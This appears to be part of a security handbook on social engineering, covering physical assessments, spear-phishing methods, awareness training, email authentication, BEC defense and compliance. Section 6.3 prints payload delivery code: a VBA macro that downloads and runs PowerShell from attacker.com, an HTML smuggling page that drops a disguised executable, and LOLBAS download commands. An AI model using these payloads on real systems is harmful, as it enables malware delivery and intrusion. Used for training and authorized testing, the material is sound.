### 5.5 Shoulder Surfing

Observing someone's screen, keyboard, or device to capture sensitive information.

**Scenarios:**
- ATM PIN observation in public
- Password entry at coffee shops
- Confidential email/document viewing on planes or trains
- Badge code entry observation

**Techniques:**
- Direct observation
- Camera positioned to capture keystrokes or screen
- Binoculars or telephoto lens for distant observation
- Screen capture via nearby webcam

**Defenses:**
- Privacy screen filters on laptops and monitors
- Screen lock policies (auto-lock after 5 minutes idle)
- Physical awareness training
- Positioning awareness: sit with back to wall

---

### 5.6 Physical Security Assessment Methodology

A structured approach to assessing physical security controls:

**Phase 1: Reconnaissance**
- Google Street View / Satellite imaging of facility
- Job postings (reveal security technologies in use)
- LinkedIn: identify security staff, cleaning crews, parking arrangements
- Social media: employee posts showing interior, access areas, ID badge format
- Public permits: fire safety reports, building permits

**Phase 2: Observation**
- Site visit as a plausible visitor (job candidate, vendor meeting)
- Observe: entry procedures, badge formats, guard rotations, delivery procedures
- Note: camera positions, security desk location, emergency exits

**Phase 3: Entry Attempts**
- Multiple entry methods tested: tailgating, impersonation, pretext entry
- Each attempt documented with time, method, outcome

**Phase 4: Objective Completion**
- Document what a real attacker could achieve: data access, device implantation, photography

**Phase 5: Reporting**
- Narrative description of each successful entry
- Evidence (photos, video if authorized)
- Risk rating and remediation recommendations

---

## 6. Spear Phishing Campaign Methodology

### 6.1 OSINT Target Research

**Email format discovery:**

```bash
# hunter.io API
curl "https://api.hunter.io/v2/domain-search?domain=targetcompany.com&api_key=YOUR_KEY"

# Email permutation tools
# Common formats: first.last, flast, firstl, first_last, firstname
python3 -c "
first='john'
last='smith'
domain='company.com'
formats = [
    f'{first}.{last}@{domain}',
    f'{first[0]}{last}@{domain}',
    f'{first}{last[0]}@{domain}',
    f'{first}@{domain}',
    f'{first}_{last}@{domain}',
    f'{last}.{first}@{domain}',
    f'{first[0]}.{last}@{domain}',
]
for fmt in formats: print(fmt)
"

# LinkedIn employee enumeration (TheHarvester)
theHarvester -d targetcompany.com -b linkedin -l 100

# Verify email existence without sending (SMTP VRFY or catch-all detection)
# Use tools like email-verifier, NeverBounce API (for authorized testing)
```

**OSINT tools for target research:**

| Tool | Use Case |
|------|----------|
| Maltego | Visual relationship mapping |
| Recon-ng | Modular OSINT framework |
| theHarvester | Email, host, domain harvesting |
| SpiderFoot | Automated OSINT collection |
| Shodan | Internet-exposed service discovery |
| OSINT Framework | Directory of OSINT resources |
| LinkedIn Sales Navigator | Professional relationship mapping |
| Hunter.io | Email format discovery |

---

### 6.2 Pretext Development

**Aligning pretext with current events:**

```
Research → Current Trigger → Pretext
─────────────────────────────────────────────────────────────────────────────
Company announced M&A → "Due diligence document request from acquiring firm's counsel"
Recent data breach → "Mandatory credential reset following security incident"
Active hiring → "Interview confirmation for [position] with [known manager name]"
Quarterly earnings → "Board presentation materials — confidential, please verify access"
Regulatory filing → "SEC comment letter response — please review the attached draft"
New product launch → "Press embargo materials — NDA signature required before viewing"
Trade show/conference → "Attendee list and session materials from [conference name]"
```

---

### 6.3 Payload Delivery Techniques

**Malicious macro documents:**

```vba
' VBA macro in Office document (for authorized testing / awareness)
' Typical execution chain: Document_Open → Shell → PowerShell download
Private Sub Document_Open()
    Dim cmd As String
    cmd = "powershell.exe -WindowStyle Hidden -exec bypass -c " & _
          "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/p.ps1')"
    Shell "cmd /c " & cmd, vbHide
End Sub
```

**HTML Smuggling:**

HTML smuggling uses JavaScript to assemble a file in the browser, bypassing email gateway file scanning (gateways scan the email body and attachments, not dynamically assembled browser content).

```html
<!DOCTYPE html>
<html>
<body>
<script>
// Payload encoded as base64 or byte array — assembled client-side
var fileData = "TVqQAAMAAAAEAAAA..."; // base64-encoded payload

// Decode and create a Blob
function base64ToUint8(base64) {
    var raw = window.atob(base64);
    var uint8 = new Uint8Array(raw.length);
    for (var i = 0; i < raw.length; i++) {
        uint8[i] = raw.charCodeAt(i);
    }
    return uint8;
}

var data = base64ToUint8(fileData);
var blob = new Blob([data], {type: 'application/octet-stream'});
var url = window.URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'invoice_Q4_2024.exe';
document.body.appendChild(a);
a.click();
window.URL.revokeObjectURL(url);
</script>
<p>Your document is being prepared. If it does not download automatically,
   <a href="#" onclick="return false;">click here</a>.</p>
</body>
</html>
```

**ISO/IMG file delivery:**

```
# Attackers use disk image files (.iso, .img, .vhd) to bypass Mark-of-the-Web (MOTW)
# MOTW is not applied to files extracted from disk images on older Windows versions
# Typical structure of a malicious ISO:
malicious.iso
├── invoice.lnk          # Shortcut → executes payload
├── payload.dll          # Actual malicious DLL
└── decoy_document.pdf   # Opens to not arouse suspicion
```

**LOLBAS (Living Off the Land Binaries and Scripts):**

| Binary | Technique |
|--------|-----------|
| `mshta.exe` | Execute remote HTA: `mshta http://attacker.com/p.hta` |
| `certutil.exe` | Download files: `certutil -urlcache -split -f http://attacker.com/p.exe p.exe` |
| `regsvr32.exe` | Execute remote SCT: `regsvr32 /s /n /u /i:http://attacker.com/p.sct scrobj.dll` |
| `wscript.exe` | Execute JS/VBS: `wscript payload.js` |
| `rundll32.exe` | Load DLL: `rundll32 javascript:"\..\mshtml,RunHTMLApplication ";...` |
| `bitsadmin.exe` | Download: `bitsadmin /transfer job http://attacker.com/p.exe C:\p.exe` |

---

### 6.4 Campaign Tracking and Metrics

**Key metrics for phishing simulations:**

| Metric | Formula | Benchmark Target |
|--------|---------|-----------------|
| Email Delivery Rate | Delivered / Sent | > 95% |
| Open Rate | Opened / Delivered | Varies (tracking pixel reliability) |
| Click Rate | Clicked / Delivered | < 5% (mature program) |
| Submission Rate | Submitted Creds / Clicked | < 2% (mature program) |
| Report Rate | Reported / Delivered | > 70% (mature program) |
| Time to Report | Avg minutes to report | < 15 minutes |
| Repeat Clicker Rate | Users clicking 2+ campaigns | Track for targeted training |

**Baseline → Training → Retest cycle:**
1. Run baseline campaign with no prior warning
2. Provide targeted training to clickers immediately (teachable moment)
3. Re-run similar campaign 30/60/90 days later
4. Measure improvement; repeat for persistent high-risk users

---

## 7. Security Awareness Training

### 7.1 Phishing Simulation Program Design

**Program components:**

1. **Executive sponsorship:** CISO and C-suite visible endorsement
2. **Policy foundation:** Acceptable use policy, security awareness policy
3. **Baseline assessment:** Initial phishing simulation to establish click rate
4. **Training curriculum:** Role-based training modules
5. **Simulation schedule:** Quarterly simulations minimum, monthly for high-risk roles
6. **Just-in-time training:** Automatic training triggered by clicking simulation
7. **Metrics and reporting:** Dashboard for leadership and departmental metrics
8. **Culture program:** Recognition for reporters, no punishment for clickers

**Simulation difficulty ladder:**

| Level | Characteristics | Target Click Rate |
|-------|----------------|-------------------|
| 1 - Very Easy | Obvious red flags, generic sender | < 30% |
| 2 - Easy | Brand impersonation, generic content | < 15% |
| 3 - Medium | Personalized sender, plausible pretext | < 10% |
| 4 - Hard | Spear phish, OSINT-driven personalization | < 5% |
| 5 - Very Hard | Whaling, multi-channel, voice follow-up | Benchmark only |

---

### 7.2 Training Platforms

| Platform | Key Features |
|----------|--------------|
| KnowBe4 | Largest library (18,000+ templates), AI-driven personalization, PhishER triage |
| Proofpoint Security Awareness | Deep integration with Proofpoint email gateway, ThreatSim |
| Cofense | PhishMe simulations, Cofense Reporter button, threat intelligence feed |
| Mimecast Awareness Training | Video-based modules, gamification, reporting |
| Terranova Security | NIST-aligned, multilingual, compliance tracking |
| Infosec IQ | PhishSim, custom templates, role-based training |
| Microsoft Attack Simulator | Native M365 integration, basic simulation and training |

---

### 7.3 NIST SP 800-50: Building an IT Security Awareness Program

NIST Special Publication 800-50 provides guidance for building and maintaining IT security awareness and training programs.

**Key NIST 800-50 elements:**

1. **Establish a program:** Assign a security awareness program manager; obtain executive sponsorship
2. **Awareness vs. training distinction:**
   - *Awareness* = broad exposure to security concepts for all employees
   - *Training* = skills development for specific roles (IT staff, admins)
   - *Education* = in-depth expertise for security professionals
3. **Needs assessment:** Identify what employees need to know by role
4. **Content development:** Mix of formats — video, CBT, in-person, simulations
5. **Implementation:** LMS integration, mandatory completion tracking
6. **Program evaluation:** Pre/post assessments, simulation metrics, incident correlation

**Recommended training cadence (NIST 800-50):**
- Annual security awareness training for all personnel
- Role-specific training for privileged users (quarterly)
- New employee training within first week of employment
- Training after security incidents involving human factors

---

### 7.4 Anti-Phishing Email Training: Recognition Checklist

Train employees to examine:

```
SENDER ANALYSIS
□ Does the display name match the email address?
□ Is the domain spelled correctly? (rn vs m, 0 vs o)
□ Is this an expected sender for this type of request?
□ Does the sending domain match the company's known domain?

CONTENT ANALYSIS
□ Does the email create urgency or a threat?
□ Does it ask for sensitive information (passwords, SSNs, credentials)?
□ Does it contain unexpected attachments?
□ Are there spelling/grammar errors inconsistent with the claimed sender?
□ Does the request seem unusual for the stated sender?

LINK ANALYSIS
□ Hover over links before clicking — does the URL match the display text?
□ Is the URL using a lookalike domain or URL shortener?
□ Does the URL use HTTPS? (necessary but not sufficient)
□ Would a legitimate organization send you here?

WHEN IN DOUBT
□ Do NOT click links or open attachments
□ Contact the sender via a known-good channel (call, look up their number independently)
□ Report to security team via PhishAlert button or security@company.com
```

---

### 7.5 Security Champions Program

A security champions program embeds security advocates in each business unit or development team.

**Structure:**
- 1 security champion per team/department (10-20 employees per champion)
- Champions receive additional training and direct access to security team
- Champions serve as first responders for security questions and incidents
- Monthly champions meetup with security team for threat briefings

**Benefits:**
- Scales security awareness without scaling the security team
- Reduces ticket volume to the security team
- Creates local accountability and peer influence
- Improves security culture from within teams

---

### 7.6 Reporting Culture: "See Something, Report Something"

A healthy reporting culture is the single most impactful defense against social engineering. An employee who reports a suspicious email stops not just one phishing attempt but potentially exposes an active campaign.

**Enabling reporting:**
- Physical PhishAlert button (Cofense, KnowBe4) integrated into email client
- Single-click reporting: minimize friction to near zero
- Acknowledge every report with an automated or manual response
- Never punish employees for clicking; reward employees for reporting
- Share anonymized threat intelligence from reports back with employees: "Your colleagues reported 47 phishing attempts this week — here's what they looked like"

**SIEM integration for phishing reports:**
```
# Example: Splunk ingestion of PhishAlert reports
# Configure PhishAlert to forward reports to SIEM via email or API
# Splunk search for rapid response
index=phishing_reports earliest=-1h
| stats count by sender_domain, subject
| sort -count
| where count > 3
# Alert: Multiple reports of same campaign within 1 hour → trigger IR playbook
```

---

## 8. Technical Countermeasures

### 8.1 Email Authentication: SPF, DKIM, DMARC

**Complete SPF configuration:**

```dns
; DNS TXT record for company.com
; Authorize specific IP ranges and mail providers
company.com.  IN  TXT  "v=spf1 ip4:203.0.113.0/24 include:_spf.google.com include:sendgrid.net -all"

; SPF mechanisms:
; ip4: / ip6: — specific IP addresses or ranges
; include: — delegate to another domain's SPF
; a: — authorize the domain's A record IP
; mx: — authorize the domain's MX record IPs
; -all — hard fail (reject) for non-matching senders (recommended)
; ~all — soft fail (tag as spam) — less strict
; ?all — neutral — avoid in production
```

**DKIM configuration:**

```bash
# Generate DKIM key pair
openssl genrsa -out dkim_private.key 2048
openssl rsa -in dkim_private.key -pubout -out dkim_public.key

# DNS TXT record
selector1._domainkey.company.com.  IN  TXT  "v=DKIM1; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA..."

# Postfix DKIM signing (opendkim)
# /etc/opendkim.conf
Domain          company.com
KeyFile         /etc/opendkim/keys/company.com/selector1.private
Selector        selector1
Socket          inet:8891@localhost
```

**DMARC configuration (full deployment):**

```dns
; Start with monitoring policy (p=none), graduate to p=reject
; Phase 1: Monitor
_dmarc.company.com.  IN  TXT  "v=DMARC1; p=none; rua=mailto:dmarc-agg@company.com; ruf=mailto:dmarc-forensic@company.com; sp=none; aspf=r; adkim=r; fo=1"

; Phase 2: Quarantine
_dmarc.company.com.  IN  TXT  "v=DMARC1; p=quarantine; pct=25; rua=mailto:dmarc-agg@company.com; ruf=mailto:dmarc-forensic@company.com; sp=quarantine; aspf=s; adkim=s"

; Phase 3: Reject (final)
_dmarc.company.com.  IN  TXT  "v=DMARC1; p=reject; rua=mailto:dmarc-agg@company.com; ruf=mailto:dmarc-forensic@company.com; sp=reject; aspf=s; adkim=s; fo=1"

; Parameters:
; p=     — policy: none, quarantine, reject
; pct=   — percentage of messages to apply policy (0-100)
; rua=   — aggregate report destination
; ruf=   — forensic report destination
; sp=    — subdomain policy
; aspf=  — SPF alignment: r (relaxed) or s (strict)
; adkim= — DKIM alignment: r (relaxed) or s (strict)
; fo=    — forensic reporting: 0=failure, 1=any auth failure, d=DKIM fail, s=SPF fail
```

**DMARC deployment timeline:**

| Week | Action |
|------|--------|
| 1-4 | Deploy p=none, collect aggregate reports |
| 5-8 | Identify all legitimate sending sources from rua reports |
| 9-12 | Ensure all legitimate sources pass SPF or DKIM |
| 13-16 | Upgrade to p=quarantine; pct=10, monitor |
| 17-20 | Increase pct=50, monitor |
| 21-24 | Increase pct=100 |
| 25+ | Upgrade to p=reject |

---

### 8.2 Email Header Analysis

When investigating a suspicious email, analyze these headers:

```
HEADER ANALYSIS CHECKLIST

Return-Path: <actual-sender@domain.com>
  □ Does the Return-Path domain match the From domain?
  □ Is the Return-Path domain known-good?

From: "Display Name" <email@domain.com>
  □ Does the display name match a real person?
  □ Does the email domain match the displayed organization?

Received: chain (read bottom-to-top — each hop adds a Received header)
  □ Trace the message path from origin to destination
  □ Check originating IP against known legitimate senders
  □ Look for unexpected geographic hops

Authentication-Results: mx.google.com;
  dkim=pass header.d=legitimate.com;
  spf=pass (domain allows IP) smtp.mailfrom=legitimate.com;
  dmarc=pass (p=reject) header.from=legitimate.com
  □ Are all three (SPF, DKIM, DMARC) passing?
  □ Does the dkim domain match the From domain?
  □ Does DMARC alignment pass?

Message-ID: <unique-id@sending-server.com>
  □ Does the Message-ID domain match the From domain?
  □ Is the Message-ID format consistent with the claimed sending system?

X-Mailer / X-Originating-IP:
  □ Does the X-Originating-IP match the claimed sender's infrastructure?
  □ Does the mailer string match the claimed organization's mail platform?
```

**Tools for header analysis:**
- Google Admin Toolbox Message Header Analyzer
- MXToolbox Email Header Analyzer
- Mail Header Analyzer (mailheader.org)

---

### 8.3 Anti-Phishing Gateways

| Platform | Key Capabilities |
|----------|-----------------|
| Proofpoint Email Protection | Advanced threat protection, URL rewriting (TAP), DMARC enforcement, BEC detection |
| Mimecast | URL protection, attachment sandboxing, impersonation protection, email archiving |
| Microsoft Defender for Office 365 | Safe Links (URL detonation), Safe Attachments (sandbox), ATP anti-phishing, BEC protection |
| Cisco Secure Email (IronPort) | Anti-spam, anti-malware, Cisco Talos threat intelligence integration |
| Barracuda Email Security | Inbound/outbound filtering, link protection, AI-based BEC detection |

**Microsoft Defender for Office 365 — Safe Links configuration:**

```powershell
# PowerShell: Configure Safe Links policy
New-SafeLinksPolicy -Name "CompanyWideSafeLinks" `
    -EnableSafeLinksForEmail $true `
    -EnableSafeLinksForTeams $true `
    -ScanUrls $true `
    -DeliverMessageAfterScan $true `
    -EnableForInternalSenders $true `
    -AllowClickThrough $false `
    -TrackUserClicks $true `
    -DoNotRewriteUrls @()

New-SafeLinksRule -Name "CompanyWideSafeLinksRule" `
    -SafeLinksPolicy "CompanyWideSafeLinks" `
    -RecipientDomainIs "company.com" `
    -Priority 0
```

---

### 8.4 FIDO2 / Hardware Security Keys (Phishing-Resistant MFA)

FIDO2 is a W3C/FIDO Alliance standard that provides cryptographic, phishing-resistant authentication. Unlike TOTP or push MFA, FIDO2 keys are origin-bound — the credential is tied to the exact domain. A phishing proxy cannot relay authentication to a different domain.

**Why FIDO2 defeats AiTM:**
- During registration, the authenticator stores the relying party ID (domain)
- During authentication, the authenticator verifies the origin matches the registered domain
- If a reverse proxy redirects to a different domain, the authentication fails silently from the user's perspective — the credential simply will not work

**FIDO2 hardware authenticators:**

| Device | Form Factor | Price |
|--------|-------------|-------|
| YubiKey 5 Series | USB-A/C, NFC | $50-70 |
| Google Titan Security Key | USB-A/C, NFC | $30 |
| Feitian BioPass | USB with fingerprint | $40-80 |
| Thetis | USB-A with rotating cover | $25 |

**Azure AD / Microsoft Entra FIDO2 deployment:**

```powershell
# Enable FIDO2 authentication method policy
$policy = Get-MgPolicyAuthenticationMethodPolicyAuthenticationMethodConfiguration -AuthenticationMethodConfigurationId "fido2"

# Update to enable for all users
$params = @{
    state = "enabled"
    isAttestationEnforced = $true
    isSelfServiceRegistrationAllowed = $true
}
Update-MgPolicyAuthenticationMethodPolicyAuthenticationMethodConfiguration `
    -AuthenticationMethodConfigurationId "fido2" `
    -BodyParameter $params
```

**Passkeys** (FIDO2 synced credentials): Consumer-friendly FIDO2 implementation that syncs across devices via iCloud Keychain, Google Password Manager, or 1Password. Provides the same phishing resistance as hardware keys with improved usability.

---

### 8.5 Conditional Access and MFA Fatigue Countermeasures

**MFA fatigue attacks** bombard a user with push notifications until they approve out of frustration. Countermeasures:

**Number matching (Microsoft Authenticator):**
```
When MFA push is sent, user must enter the 2-digit number displayed on the
login screen into the Authenticator app. An attacker sending pushes without
the user actively logging in cannot know the number.
```

**Additional context:**
```
Authenticator app shows:
- Location of the sign-in attempt (city/country)
- Application requesting access
- Device that triggered the request
Users can identify unexpected sign-ins before approving
```

**Microsoft Entra Conditional Access policy (block non-compliant devices):**

```json
{
  "displayName": "Require compliant device for all cloud apps",
  "state": "enabled",
  "conditions": {
    "users": { "includeUsers": ["All"] },
    "applications": { "includeApplications": ["All"] }
  },
  "grantControls": {
    "operator": "AND",
    "builtInControls": [
      "mfa",
      "compliantDevice"
    ]
  }
}
```

---

### 8.6 DMARC Monitoring Tools

| Tool | Features |
|------|----------|
| dmarcian | Visual reporting, source discovery, guided p=reject journey |
| Postmark DMARC | Free aggregate reporting, weekly email summaries |
| Valimail | Automated SPF/DKIM alignment, enforcement recommendations |
| Google Postmaster Tools | Gmail-specific delivery analytics, domain reputation |
| Mimecast DMARC Analyzer | Enterprise monitoring, multi-domain management |
| Proofpoint Email Fraud Defense | BEC-focused DMARC + supplier risk monitoring |

---

### 8.7 Domain Monitoring

**Certificate Transparency (CT) monitoring:**

All publicly trusted TLS certificates must be logged to CT logs. Monitoring CT logs for certificates issued to lookalike domains provides early warning of phishing infrastructure.

```python
# Monitor Certificate Transparency logs via crt.sh API
import requests

def check_ct_for_lookalike(domain_keyword):
    # Search crt.sh for certificates matching a domain keyword.
    url = f"https://crt.sh/?q=%25{domain_keyword}%25&output=json"
    response = requests.get(url, timeout=30)
    if response.status_code == 200:
        certs = response.json()
        for cert in certs:
            name_value = cert.get('name_value', '')
            not_before = cert.get('not_before', '')
            print(f"Domain: {name_value} | Issued: {not_before}")
        return certs
    return []

# Example: monitor for lookalike domains of "companyname"
results = check_ct_for_lookalike("companynam")  # catches typos
```

**Automated domain monitoring services:**
- DomainTools Iris Detect: lookalike domain discovery
- PhishLabs: phishing infrastructure takedown service
- Bolster: AI-based domain and phishing detection
- URLScan.io: passive monitoring for domains scanning submitted URLs
- MarkMonitor: brand protection and domain monitoring

---

## 9. BEC (Business Email Compromise) Defense

### 9.1 BEC Financial Controls

**Process controls to prevent BEC fraud:**

| Control | Description |
|---------|-------------|
| Dual approval | All wire transfers above threshold require two authorized approvers |
| Callback verification | Before processing any payment change, call the vendor/employee on a number from the official directory (NOT from the email itself) |
| Payment change freeze | Any change to payment details triggers a 24-72 hour hold and independent verification |
| Dollar thresholds | Escalating approval requirements: $10K → manager, $50K → VP, $100K → CFO |
| Out-of-band verification | Email requests for wire transfers must be confirmed via phone call to known number |
| Vendor ACH change policy | Written policy requiring multi-step verification for any ACH/wire change request |

**Red flags for wire fraud requests:**
- Urgency and secrecy ("don't mention this to anyone else")
- Request to bypass normal procedures ("just this once")
- Email from external domain impersonating internal executive
- Unusual timing (Friday afternoon, holiday, before/after earnings)
- Request to use a new account not previously used
- Pressure to act before verification can be completed

---

### 9.2 Vendor Email Compromise (VEC)

Attackers compromise a vendor's actual email account and use it to intercept legitimate payment communication, redirecting payments to attacker-controlled accounts.

**Detection signals:**
- Payment details change request from a vendor contact
- New banking information in an invoice
- Request to update ACH information via email
- Domain age of vendor's email domain (if recently changed)
- Email received outside normal business hours or from unusual IP

**Verification procedure:**
1. Receive payment change request via email
2. Pull vendor contact information from your internal CRM/ERP — NOT from the email
3. Call the vendor's main switchboard or a known individual
4. Verbally confirm the change with a named individual
5. Document the verification (who, when, what was confirmed)
6. Implement change only after verbal confirmation

---

### 9.3 W-2 and Payroll Redirect Fraud

**W-2 scam:** Attacker impersonates CEO or HR director, emails payroll/HR requesting all employee W-2 forms — used for identity theft and fraudulent tax returns.

**Payroll redirect:** Attacker impersonates an employee, contacts HR/payroll to redirect direct deposit to a new account.

**Controls:**
- Payroll changes require in-person or video verification with photo ID
- Direct deposit changes go through HR portal with MFA — not email requests
- W-2 requests require documented approval process; bulk W-2 data never sent by email
- Train HR and payroll staff specifically on these attack patterns
- Employee notification: any payroll change triggers an email notification to the employee's current email address on file

---

### 9.4 BEC Case Studies

**Ubiquiti Networks (2015) — $46.7 million**
Attackers impersonated the company's finance department and requests from a vendor it used in Hong Kong, persuading employees to wire $46.7M over 17 transactions. The company recovered approximately $15M.

**Toyota Boshoku Corporation (2019) — $37 million**
Attackers convinced a finance executive to change the account information for a wire transfer, resulting in a $37M loss. Highlights the need for dual approval and callback verification.

**Puerto Rico Government (2020) — $2.6 million**
Attackers impersonating a government contractor convinced the Puerto Rico Industrial Development Company to change bank account information for an existing vendor. Three separate fraudulent transfers occurred.

**Barbara Corcoran (2020) — $388,000**
An attacker spoofed an email from Barbara Corcoran's assistant to her bookkeeper, requesting payment of invoices totaling $388,000. The bookkeeper sent the wire before verification was sought. The funds were recovered in this case.

**Key lessons from BEC cases:**
1. The email address can always be spoofed or compromised
2. Senior executive requests bypass psychological security checks
3. Urgency and secrecy framing is used in virtually every case
4. Phone callback on a number from the corporate directory (not the email) would have prevented all of these

---

### 9.5 FBI IC3 BEC Reporting

The FBI's Internet Crime Complaint Center (IC3) operates the **BEC Financial Fraud Kill Chain** — a process to attempt recovery of fraudulently transferred funds.

**If a BEC wire transfer occurs:**
1. Contact your financial institution immediately to request a SWIFT recall
2. File a complaint at **ic3.gov** within 24-48 hours for best recovery chances
3. Contact the FBI field office in your jurisdiction
4. Preserve all email evidence (full headers, not just screenshots)
5. Contact your cyber insurance carrier
6. Engage outside counsel if regulatory reporting is required

**Recovery statistics:** IC3 reports that when organizations report within 72 hours, recovery rates are significantly higher. After 72 hours, wired funds are typically dispersed across multiple accounts, making recovery nearly impossible.

---

## 10. Regulatory and Compliance

### 10.1 NIST SP 800-177: Email Authentication Recommendations

NIST Special Publication 800-177 (Trustworthy Email) provides guidance on email authentication standards.

**Key recommendations:**
- All federal agencies (and recommended for all organizations) should implement SPF, DKIM, and DMARC
- DMARC policy should progress to p=reject
- STARTTLS should be enforced for server-to-server email transport
- Organizations should implement MTA-STS and DANE for transport security

**BOD 18-01 (DHS Binding Operational Directive):** Requires all federal agencies to implement DMARC with p=reject, STARTTLS, and web security standards. Has become a de facto benchmark for enterprise email security.

---

### 10.2 PCI DSS Phishing Requirements

PCI DSS v4.0 addresses social engineering in several requirements:

| Requirement | Description |
|-------------|-------------|
| 12.6 | Security awareness program must address phishing and social engineering |
| 12.6.3 | Employees must receive security awareness training upon hire and at least annually |
| 12.6.3.1 | Awareness training must include: phishing/social engineering threats; acceptable use; cardholder data protection |
| 12.6.3.2 | Security awareness training must include a review of the organization's security policies |
| 5.4.1 | Anti-phishing mechanisms must be in place to protect against phishing attacks |
| 12.10.7 | Incident response procedures must include response to phishing |

---

### 10.3 HIPAA Social Engineering Requirements

HIPAA does not prescribe specific technical standards but requires covered entities to protect PHI from social engineering threats:

- **Administrative Safeguards (§164.308):** Security awareness and training required; must address malware and phishing threats
- **Workforce Training (§164.308(a)(5)):** Procedures for guarding against unauthorized access to ePHI from social engineering
- **Security Incident Procedures (§164.308(a)(6)):** Must include response to social engineering-based breaches
- **Breach Notification (§164.400):** BEC attacks resulting in PHI disclosure require breach notification to HHS and affected individuals

---

### 10.4 SEC Cybersecurity Disclosure Guidance

The SEC's 2023 cybersecurity disclosure rules (Release No. 33-11216) require:

- **Material incident disclosure:** BEC or phishing incidents resulting in material financial impact must be disclosed within 4 business days on Form 8-K (Item 1.05)
- **Annual disclosure (10-K):** Material aspects of cybersecurity risk management, strategy, and governance
- **Board oversight disclosure:** How the board oversees cybersecurity risk

The $46.7M Ubiquiti BEC incident triggered SEC disclosure requirements and demonstrates that BEC is within the scope of material cybersecurity incidents.

---

### 10.5 Social Engineering in Penetration Testing Scope

**Scope document considerations for social engineering engagements:**

```
SOCIAL ENGINEERING ENGAGEMENT SCOPE DOCUMENT (template)

1. AUTHORIZED TARGETS
   □ Specify target employee groups (all staff / specific departments / executives only)
   □ Named exclusions (e.g., employees currently on leave, employees in certain jurisdictions)

2. AUTHORIZED TECHNIQUES
   □ Phishing (email)
   □ Vishing (phone calls)
   □ Smishing (SMS)
   □ Physical (tailgating, impersonation)
   □ USB drops
   □ Pretexting (specify permitted pretexts)

3. PROHIBITED ACTIONS
   □ No credential use against production systems
   □ No data exfiltration of real company data
   □ No activity that would trigger regulatory breach notification
   □ No recording of calls without legal review (wiretapping laws vary by jurisdiction)

4. AUTHORIZATION AND CONTACTS
   □ Authorized signatory (legal authority to authorize testing)
   □ Emergency contact for get-out-of-jail letter calls
   □ Rules of engagement for when to abort an attempt

5. DECONFLICTION
   □ Process for alerting client security team if real phishing detected during engagement
   □ Disclosure timing and process
```

---

## 11. MITRE ATT&CK Mapping

### 11.1 Social Engineering Techniques in ATT&CK

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) provides a structured taxonomy of adversary behaviors.

**Initial Access — Phishing (T1566) and sub-techniques:**

| Technique ID | Name | Description |
|-------------|------|-------------|
| T1566 | Phishing | Parent technique |
| T1566.001 | Spearphishing Attachment | Malicious file attachment in targeted email |
| T1566.002 | Spearphishing Link | Malicious URL in targeted email |
| T1566.003 | Spearphishing via Service | Phishing via third-party services (LinkedIn, Slack, social media) |
| T1566.004 | Spearphishing Voice | Vishing — voice call-based phishing |

**Reconnaissance — Gather Victim Identity Information (T1589):**

| Technique ID | Name | Description |
|-------------|------|-------------|
| T1589 | Gather Victim Identity Information | Parent technique |
| T1589.001 | Credentials | Search for leaked credentials |
| T1589.002 | Email Addresses | Enumerate valid email addresses |
| T1589.003 | Employee Names | Collect employee names for pretexting |

**Resource Development (T1598) — Phishing for Information:**

| Technique ID | Name | Description |
|-------------|------|-------------|
| T1598 | Phishing for Information | Parent technique (credential harvesting) |
| T1598.001 | Spearphishing Service | Credential phishing via third-party service |
| T1598.002 | Spearphishing Attachment | Credential phishing via attachment |
| T1598.003 | Spearphishing Link | Credential phishing via link |
| T1598.004 | Spearphishing Voice | Credential phishing via voice |

**Additional relevant techniques:**

| Technique ID | Name | Description |
|-------------|------|-------------|
| T1204.001 | User Execution: Malicious Link | User clicks malicious link |
| T1204.002 | User Execution: Malicious File | User opens malicious attachment |
| T1056.001 | Keylogging | Capture keystrokes from phishing payload |
| T1539 | Steal Web Session Cookie | AiTM session cookie theft |
| T1557 | Adversary-in-the-Middle | AiTM proxy attacks |
| T1199 | Trusted Relationship | Vendor compromise for BEC |
| T1078 | Valid Accounts | Use of stolen credentials |
| T1550.004 | Use Alternate Authentication Material: Web Session Cookie | Replay stolen cookies |

**Detection and mitigation mappings:**

For T1566 (Phishing):
- **Mitigations:** M1049 (Anti-virus/Malware), M1031 (Network Intrusion Prevention), M1054 (Software Configuration — email filtering), M1017 (User Training), M1032 (Multi-factor Authentication)
- **Detections:** DS0015 (Application Log — email gateway logs), DS0029 (Network Traffic), DS0022 (File — malicious attachment creation/execution)

---

## 12. Quick Reference Checklists

### 12.1 Phishing Email Indicators of Compromise (IOCs)

```
TECHNICAL INDICATORS
- Sender domain registered within last 30 days
- DMARC fail / SPF fail / DKIM fail in Authentication-Results
- Mismatched Return-Path and From domains
- Originating IP in threat intelligence feeds
- URL redirects through URL shortener to suspicious domain
- SSL certificate issued by Let's Encrypt for a lookalike domain (check crt.sh)
- HTML contains tracking pixel from unknown domain

BEHAVIORAL INDICATORS
- Unsolicited email with request for credentials or payment
- Urgency language ("24 hours," "immediate action," "final notice")
- Requests to override normal procedures
- Executive name in From display but non-executive domain in email address
- Request to keep action confidential from colleagues
- Attachment: .iso, .img, .lnk, .js, .hta, .wsf, encrypted .zip
```

### 12.2 BEC Incident Response Checklist

```
IMMEDIATE (0-2 hours)
□ Contact sending financial institution's wire transfer fraud department
□ Request urgent recall via SWIFT gpi Tracker
□ Preserve all email evidence (export with full headers — EML format)
□ Identify all email accounts that may be compromised
□ Reset passwords for suspected compromised accounts
□ Notify CISO and legal counsel

SHORT-TERM (2-24 hours)
□ File IC3 complaint at ic3.gov
□ Contact FBI field office
□ Notify cyber insurance carrier and open claim
□ Forensic review of email account for exfiltration scope
□ Identify all recipients of any malicious emails sent from compromised account
□ Review email forwarding rules (attackers often install auto-forward rules)
□ Check for unauthorized mail delegation or OAuth app grants

MEDIUM-TERM (24-72 hours)
□ Notify affected vendors and partners
□ Review regulatory notification requirements (SEC 8-K, state breach notification)
□ Customer notification if applicable
□ Post-incident review of controls that failed
□ Updated procedures to prevent recurrence
```

### 12.3 Social Engineering Red Flags Quick Card

```
RED FLAGS — STOP AND VERIFY
⚠ Urgency: "must be done today/now/immediately"
⚠ Secrecy: "don't mention this to anyone / keep this between us"
⚠ Authority pressure: "the CEO/CFO is waiting for this"
⚠ Fear: "your account will be closed / you will be arrested"
⚠ Too good to be true: prizes, unexpected windfalls
⚠ Requests to bypass normal procedures
⚠ Request for credentials, OTPs, or payment changes via email/phone
⚠ Caller ID shows a known number but something feels off

